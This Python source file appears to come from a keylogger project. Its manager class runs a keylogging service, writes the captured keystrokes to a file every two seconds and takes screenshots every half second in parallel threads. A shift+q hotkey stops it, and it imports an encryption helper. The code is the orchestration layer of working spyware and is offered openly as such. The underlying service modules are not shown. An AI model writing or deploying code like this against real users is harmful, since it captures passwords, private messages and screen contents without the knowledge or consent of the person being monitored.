from Write_to_file import FileWriter
from KeyLogger_Service import KeyloggerService
from encrption.encrypt_file import create_key,encrypt_data

import os
import time
import keyboard
import pygetwindow
import threading




class KeyLoggerManager:
    def __init__(self):
        self.__instance = KeyloggerService()

    def start(self):
        self.__instance._start()

    def write_file(self):
        FileWriter.write_to_file(self.__instance.data)

    def __thread_take_shot(self):
        while self.__instance._KeyloggerService__action:
            self.__instance._take_shot()
            time.sleep(0.5)

    def __write_file(self):
        while self.__instance._KeyloggerService__action:
            self.write_file()
            time.sleep(2)
        self.write_file()

    def main(self):
        threading.Thread(target=self.start).start()
        threading.Thread(target=self.__write_file).start()
        threading.Thread(target=self.__thread_take_shot).start()
        while self.__instance._KeyloggerService__action:
            self.stop()
            time.sleep(0.1)

    def stop(self):
        if keyboard.is_pressed('shift+q'):
            self.__instance._KeyloggerService__change_action()



KeyLoggerManager().main()